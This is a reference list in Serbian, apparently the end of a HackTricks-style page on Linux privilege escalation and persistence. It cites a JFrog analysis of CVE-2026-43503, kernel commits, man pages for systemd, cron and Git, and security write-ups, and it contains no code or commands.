- [9] [JFrog: Analiza i eksploatacija Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Ispravka za Linux: net: skb: očuvanje `SKBFL_SHARED_FRAG` u funkciji `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranije ublažavanje za Linux: postavljanje `SKBFL_SHARED_FRAG` za UDP pakete prosleđene splice operacijom (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — stranica priručnika za Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asocijacije MIME aplikacija](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifikacija Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifikacija Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Jezik Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ranjivost Linux kernela AF_ALG page cache](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacija za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacija za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacija za konfiguraciju Gita](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — stranica priručnika za Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacija za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mehanizmi perzistencije](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
